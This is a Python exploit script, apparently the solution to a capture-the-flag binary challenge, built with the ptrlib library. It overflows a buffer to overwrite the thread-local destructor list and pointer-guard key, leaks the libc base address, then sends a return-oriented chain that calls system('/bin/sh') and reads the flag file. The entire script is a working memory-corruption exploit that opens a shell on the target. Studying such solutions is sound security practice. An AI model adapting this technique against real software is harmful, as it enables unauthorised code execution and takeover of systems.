import os
from ptrlib import *

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9004))

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#sock = Process("../distfiles/chall")
sock = Socket(HOST, PORT)

payload  = b'A'*0x7d8
payload += p64(0x404005) # tls_dtor_list = rbp
payload += b'A'*0x60
payload += p64(0x404000) # thread futex
payload += b'\x00'*0x18
payload += p64(0x4012c3) # xor key
payload += b'A'*0x100

sock.sendlineafter("size: ", str(len(payload)))
sock.sendlineafter("data: ", payload)
libc.base = u64(sock.recvonce(8)) - 0x21af00

payload  = p64(next(libc.gadget("ret"))) * 0x41
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.find("/bin/sh")))
payload += p64(libc.symbol("system"))
payload += b'B'*(0x870 - len(payload))
payload += p64(0x404800) # tls_dtor_list = rbp
payload += b'C'*0x60
payload += p64(0x404000) # thread futex
payload += b'\x00'*0x18
payload += p64(next(libc.gadget("add rsp, 0xa8; ret;"))) # xor key
sock.sendline(payload)

sock.sendline("cat /flag-*")
print(sock.recvuntil(b"}"))
